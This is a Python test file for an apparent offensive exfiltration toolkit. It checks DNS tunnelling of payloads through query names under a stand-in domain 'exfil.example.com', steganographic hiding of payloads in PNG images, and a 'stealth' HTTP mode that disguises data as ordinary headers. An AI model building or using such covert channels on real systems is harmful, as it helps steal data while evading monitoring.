"""قناة DNS (ترميز/فك/إعادة تجميع) + إخفاء PNG (حلقة كاملة) + رؤوس HTTP."""
import base64
import struct
from pathlib import Path

import pytest

from modules.exfil.dns_channel import DNSChannel
from modules.exfil.http_channel import HTTPChannel
from modules.exfil.stego_png import (
    capacity, embed_payload, extract_payload, read_png, write_png,
)


def test_dns_encode_decode_roundtrip():
    payload = b"swarm-test-" * 50
    ch = DNSChannel(domain="exfil.example.com", max_label=48)
    qnames = ch.encode(payload)
    assert all(len(q) <= 253 for q in qnames)
    restored = DNSChannel.reassemble(qnames, "exfil.example.com")
    assert restored == payload


def test_dns_decode_rejects_bad_domain():
    assert DNSChannel.decode_qname("0.1.ABC.exfil.example.com", "other.com") is None


def test_dns_query_parse_roundtrip():
    q = "0.1.ABC.exfil.example.com"
    pkt = DNSChannel.build_query(q)
    assert DNSChannel.parse_query(pkt) == q


def _make_png(w: int, h: int, ch: int) -> Path:
    raw = bytes((i * 7 + j * 13) % 256
                for i in range(h) for _ in range(1 + w * ch)
                for j in range(1))          # صفوف ببايت مرشح 0
    raw = bytearray()
    stride = 1 + w * ch
    for row in range(h):
        raw.append(0)                       # filter: None
        for x in range(w * ch):
            raw.append((row * 31 + x * 17) % 256)
    path = Path("/tmp/_cover.png")
    write_png(path, w, h, ch, bytes(raw))
    return path


def test_stego_roundtrip(tmp_path):
    cover = _make_png(64, 64, 3)
    payload = b"ENC:" + bytes(range(256))
    assert capacity(64, 64, 3) >= len(payload)

    out = tmp_path / "stego.png"
    embed_payload(cover, out, payload)
    assert extract_payload(out) == payload
    # الصورة الناتجة تبقى PNG صالحة
    w, h, ch, _ = read_png(out)
    assert (w, h, ch) == (64, 64, 3)


def test_stego_capacity_limit(tmp_path):
    cover = _make_png(16, 16, 3)            # سعة صغيرة
    with pytest.raises(ValueError):
        embed_payload(cover, tmp_path / "x.png", b"A" * 1000)


def test_http_channel_marker_and_stealth():
    payload = b"secret-bytes"
    ch = HTTPChannel(None, mode="marker")
    h = ch.encode_headers(payload)
    assert h["X-Swarm-Exfil"] == base64.b64encode(payload).decode()
    assert HTTPChannel.decode_headers(h) == payload

    ch2 = HTTPChannel(None, mode="stealth", chunk=8)
    h2 = ch2.encode_headers(payload)
    assert "X-Swarm-Exfil" not in h2
    assert h2["X-Client-Protocol"].startswith("v")
    assert HTTPChannel.decode_headers(h2) == payload
